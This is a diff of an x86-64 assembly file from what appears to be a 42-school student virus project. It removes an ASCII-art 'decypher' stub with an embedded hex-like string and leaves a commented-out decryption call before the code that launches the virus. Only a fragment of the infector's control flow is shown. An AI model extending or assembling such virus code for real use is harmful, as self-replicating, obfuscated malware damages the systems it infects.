@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/11 01:22:51 by anselme          ###   ########.fr        ;
+;    Updated: 2019/12/11 20:25:35 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -121,22 +121,7 @@ mark_below:
 	mov rdi, [rsp + 16]        ; get virus_addr
 	mov rsi, r14               ; get virus_size
 
-	call decypher_begin
-	jmp decypher_end
-decypher_begin:
-	db "               _   _               "
-	db "            __/o'V'o\__            "
-	db "         __/o \  :  / o\__         "
-	db "        /o `.  \ : /  .' o\        "
-	db "       _\    '. _Y_ .'    /_       "
-	db "      /o `-._  '\v/'  _.-` o\      "
-	db "      \_     `-./ \.-`     _/      "
-	db "     /o ``---._/   \_.---'' o\     "
-	db "     \_________\   /_________/     "
-	db "               '\_/'               "
-	db "               _|_|_               "
-	db "          2AC9C3WAR558BEC          "
-decypher_end:
+	;call decypher ;TODO uncomment!!!!!
 ;------------------------------; launch virus
 	mov rdi, rdx
 	call virus
